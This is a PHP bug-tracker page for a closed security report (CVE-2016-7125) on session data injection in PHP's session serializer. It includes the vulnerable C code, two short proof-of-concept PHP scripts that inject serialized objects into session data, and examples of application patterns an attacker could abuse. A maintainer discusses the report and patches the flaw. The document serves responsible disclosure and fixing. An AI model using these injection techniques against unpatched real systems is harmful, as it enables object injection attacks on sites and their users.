<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='Session related Bug #72681 - RDF' href='rss/bug.php?id=72681'>
        <link rel='alternate' type='application/rss+xml' title='Session related Bug #72681 - RSS 2.0' href='rss/bug.php?id=72681&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #72681 :: PHP Session Data Injection Vulnerability</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=72681">Sec Bug</a>&nbsp;#72681</th>
            <td id="summary" colspan="5">PHP Session Data Injection Vulnerability</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-07-26 16:34 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-09-05 15:28 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=Session+related">Session related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.23</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7125" target="_blank">2016-7125</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=72681&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=72681&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=72681&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1469550893">&nbsp;</a><strong>[2016-07-26 16:34 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
PHP Session Data Injection Vulnerability

```
PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */
{
...
	while (p &lt; endptr) {
		zval **tmp;
		q = p;
		while (*q != PS_DELIMITER) {
			if (++q &gt;= endptr) goto break_outer_loop;
		}
		if (p[0] == PS_UNDEF_MARKER) {
			p++;
			has_value = 0;
		} else {
			has_value = 1;
		}

		namelen = q - p;
		name = estrndup(p, namelen);
		q++;

		if (zend_hash_find(&amp;EG(symbol_table), name, namelen + 1, (void **) &amp;tmp) == SUCCESS) {
			if ((Z_TYPE_PP(tmp) == IS_ARRAY &amp;&amp; Z_ARRVAL_PP(tmp) == &amp;EG(symbol_table)) || *tmp == PS(http_session_vars)) {
				goto skip;
			}
		}
		...
skip:
		efree(name);

		p = q;
	}
```

If the session name is not allowed, then session php handler will ignore and skip the name, and continue to parsing. This means that if an attacker can control the session name, then he will be able to inject arbitrarily session data.
The similar issue also exist in session php_binary handler.

PoC:
```
&lt;?php

ini_set('session.serialize_handler', 'php');
session_start();
$_SESSION['_SESSION'] = 'ryat|O:8:&quot;stdClass&quot;:0:{}';
session_write_close();
session_start();
var_dump($_SESSION);

?&gt;
```


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=72681'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=72681'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1469665232">&nbsp;</a><strong>[2016-07-28 00:20 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Add a PoC to trigger this bug in PHP7 series. There are a few different since $GLOBALS['_SESSION'] and PS(http_session_vars) are set to reference types.

```
&lt;?php

ini_set('session.serialize_handler', 'php');
session_start();
$GLOBALS['ryat'] = $GLOBALS;
$_SESSION['ryat'] = 'ryat|O:8:&quot;stdClass&quot;:0:{}';
session_write_close();
session_start();
var_dump($_SESSION);

?&gt;
```
</pre>
</div><div class='comment type_log' ><a name="1469665982">&nbsp;</a><strong>[2016-07-28 00:33 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 5.5.38</span>
<span class="added">+PHP Version: 5.6.23</span>
</div></div></div><div class='comment type_comment' ><a name="1469665982">&nbsp;</a><strong>[2016-07-28 00:33 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>I'm not sure what you are describing here. If you already can run specific code and modify session data, then where vulnerability in the fact that you can modify session data? It's the given you can by virtue of you running the code. Or you mean you can modify the session data without running special code? Then I can't see from your examples how, since your examples require to modify session data as a precondition.
</pre>
</div><div class='comment type_log' ><a name="1469665989">&nbsp;</a><strong>[2016-07-28 00:33 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Feedback</span>
</div></div></div><div class='comment type_log' ><a name="1469666738">&nbsp;</a><strong>[2016-07-28 00:45 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Feedback</span>
<span class="added">+Status: Open</span>
</div></div></div><div class='comment type_comment' ><a name="1469666738">&nbsp;</a><strong>[2016-07-28 00:45 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>give you two example in real world&amp;apps:

```
$_SESSION = array_merge($_SESSION, $_POST);
```

```
if (isset($_GET['id']) &amp;&amp; $_GET['result']) {
	$_SESSION[$_GET['id']] = $_GET['result'];
```

you can inject any types values not only string or array via this way. and input to deserialize is still dangerous.
</pre>
</div><div class='comment type_comment' ><a name="1469671559">&nbsp;</a><strong>[2016-07-28 02:05 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>BTW, you can control the key and value in during session upload progress. If the `session.upload_progress.prefix` is set to empty string, then you can control full key name.
</pre>
</div><div class='comment type_log' ><a name="1469833481">&nbsp;</a><strong>[2016-07-29 23:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Feedback</span>
</div></div></div><div class='comment type_comment' ><a name="1469833481">&nbsp;</a><strong>[2016-07-29 23:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Wait, isn't this:

$_SESSION = array_merge($_SESSION, $_POST);

already a session injection? The same with the other one. Looks like you're using session injection to achieve session injection. I don't see how this bug changes anything. Same with upload progress - if you can control full key name, isn't it a definition of session injection?
</pre>
</div><div class='comment type_log' ><a name="1469834962">&nbsp;</a><strong>[2016-07-29 23:29 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Feedback</span>
<span class="added">+Status: Open</span>
</div></div></div><div class='comment type_comment' ><a name="1469834962">&nbsp;</a><strong>[2016-07-29 23:29 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>You can inject arbitrary serialized data via this bug. This means allows putting user input into unserialize(). And this also means you can inject any type data, ex object injection.
</pre>
</div><div class='comment type_comment' ><a name="1470206769">&nbsp;</a><strong>[2016-08-03 06:46 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>ok, I think I finally get it - it allows to inject objects where previously could be only strings. May be dangerous I guess.
</pre>
</div><div class='comment type_log' ><a name="1470209517">&nbsp;</a><strong>[2016-08-03 07:31 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1470209517">&nbsp;</a><strong>[2016-08-03 07:31 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fix in <a href="https://gist.github.com/842d0420ba4f74513e436ce47fd1108b" rel="nofollow">https://gist.github.com/842d0420ba4f74513e436ce47fd1108b</a>
 and 1ae2bdb9c146fdb3ca36081441aed6b517f51071 in security repo. Please verify.
</pre>
</div><div class='comment type_comment' ><a name="1470269388">&nbsp;</a><strong>[2016-08-04 00:09 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>The patch looks like OK.
</pre>
</div><div class='comment type_log' ><a name="1471241018">&nbsp;</a><strong>[2016-08-15 06:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: needed</span>
</div></div></div><div class='comment type_svn' ><a name="1471413449">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce</a>
Log: Fix <a href='bug.php?id=72681'>bug #72681</a> - consume data even if we're not storing them
</pre>
</div><div class='comment type_log' ><a name="1471413450">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1471422222">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce</a>
Log: Fix <a href='bug.php?id=72681'>bug #72681</a> - consume data even if we're not storing them
</pre>
</div><div class='comment type_svn' ><a name="1471425340">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce</a>
Log: Fix <a href='bug.php?id=72681'>bug #72681</a> - consume data even if we're not storing them
</pre>
</div><div class='comment type_svn' ><a name="1471518916">&nbsp;</a><strong>[2016-08-18 11:15 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=61156f0d68704df748b5cbf08c77582c208db8c9" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=61156f0d68704df748b5cbf08c77582c208db8c9</a>
Log: Fix <a href='bug.php?id=72681'>bug #72681</a> - consume data even if we're not storing them
</pre>
</div><div class='comment type_log' ><a name="1473089293">&nbsp;</a><strong>[2016-09-05 15:28 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2016-7125</span>
</div></div></div><div class='comment type_svn' ><a name="1476698978">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8763c6090d627d8bb0ee1d030c30e58f406be9ce</a>
Log: Fix <a href='bug.php?id=72681'>bug #72681</a> - consume data even if we're not storing them
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
